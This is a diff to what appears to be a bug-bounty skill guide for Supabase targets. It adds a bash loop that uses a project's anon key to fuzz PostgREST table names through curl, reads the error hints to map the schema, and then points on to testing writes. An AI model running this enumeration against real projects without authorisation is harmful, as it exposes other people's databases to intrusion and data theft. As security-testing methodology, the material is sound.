@@ -357,11 +357,38 @@ Data leakage
 
 ## Related Skills
 
-- hunt-firebase — Firebase/Firestore/GCP sibling exploitation (similar anon-key pattern)
-- hunt-source-leak — API key discovery in JS bundles, .env, source maps
-- hunt-idor — RLS-bypass via organization_id is an IDOR variant
-- hunt-api-misconfig — REST API endpoint enumeration methodology
-- hunt-cors — CORS on Supabase REST API endpoints
+- `hunt-firebase` — Firebase/Firestore/GCP sibling exploitation (similar anon-key pattern)
+- `hunt-source-leak` — API key discovery in JS bundles, .env, source maps
+- `hunt-idor` — RLS-bypass via organization_id is an IDOR variant
+- `hunt-api-misconfig` — REST API endpoint enumeration methodology
+- `hunt-cors` — CORS on Supabase REST API endpoints
+- `hunt-schema-enumeration` — Error hint enumeration technique (primary method for discovering Supabase table names)
+- `hunt-write-gap` — Test PATCH/POST/DELETE after finding tables via schema enumeration
+
+---
+
+## Error Hint Enumeration — Schema Discovery
+
+PostgREST returns table name hints when you query a non-existent table. This is the fastest way to map the entire Supabase schema:
+
+```bash
+SUPABASE_URL="https://PROJECT.supabase.co"
+ANON_KEY="eyJ..."
+
+# Fuzz common table names — PostgREST hints reveal real tables
+for table in users profiles posts products orders data config settings \
+  sessions subscribers movements payments transactions wallets accounts; do
+  result=$(curl -sk "${SUPABASE_URL}/rest/v1/${table}?select=*&limit=1" \
+    -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" 2>/dev/null)
+  hint=$(echo "$result" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('hint',''))" 2>/dev/null)
+  if [ -n "$hint" ]; then echo "  ${table} -> ${hint}"; fi
+done
+
+# Response pattern: {"hint":"Perhaps you meant the table 'public.real_name'"}
+# Build wordlist from hints, iterate until no new tables discovered
+```
+
+After mapping the schema, proceed to `hunt-write-gap` to test write operations on discovered tables.
 
 ## Common Supabase Finding Formats
 
